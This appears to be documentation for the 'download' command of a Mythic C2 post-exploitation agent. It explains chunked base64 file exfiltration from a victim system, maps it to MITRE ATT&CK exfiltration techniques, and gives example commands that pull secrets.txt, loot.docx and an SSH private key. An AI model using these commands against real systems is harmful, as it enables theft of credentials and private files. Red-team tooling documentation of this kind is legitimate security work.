# 📥 `download` Command – Retrieve Remote Files

The `download` command transfers a file from the target (agent) machine back to the **Mythic server**, in **base64-encoded chunks**. It is an essential tool for extracting credentials, config files, and sensitive artifacts during post-exploitation.

---

## 🧾 Arguments

| Argument | Type     | Description                      | Required |
|----------|----------|----------------------------------|----------|
| `file`   | `string` | Absolute or relative path to file on the victim system | ✅ Yes   |

- You can provide the path directly, with or without quotes.
- Handles files on Windows, Linux, or macOS platforms.

---

## 💻 Usage Examples

```bash
download /home/user/secrets.txt
download C:\\Users\\Admin\\Desktop\\loot.docx
download ../.ssh/id_rsa
```

---

## 🔁 Behavior

- Resolves the path relative to the agent’s current directory if not absolute.
- Splits the file into chunks based on `CHUNK_SIZE`.
- Encodes each chunk in Base64 and sends it back to Mythic.
- Supports stopping mid-download if the task is cancelled.
- Returns a final JSON response containing the agent file ID.


---

## 🧩 MITRE ATT&CK Mapping

| Technique ID | Name                                |
|--------------|-------------------------------------|
| T1020        | Automated Exfiltration              |
| T1030        | Data Transfer Size Limits           |
| T1041        | Exfiltration Over C2 Channel        |

---

## 📦 File Transfer Workflow

1. 🧠 Client requests file download.
2. 📊 Agent calculates total chunks and chunk size.
3. 🧱 File is read in binary mode and divided.
4. 🔐 Each chunk is Base64 encoded and posted to Mythic.
5. 🧾 Final response includes unique file ID.

---

## ✅ Supported Platforms

- ✅ Linux
- ✅ Windows
- ✅ macOS

Compatible with:
- Python 2.7
- Python 3.8+

---

## 🔐 Permissions

- Does **not** require administrative privileges.
- Agent must have **read access** to the specified file.

---


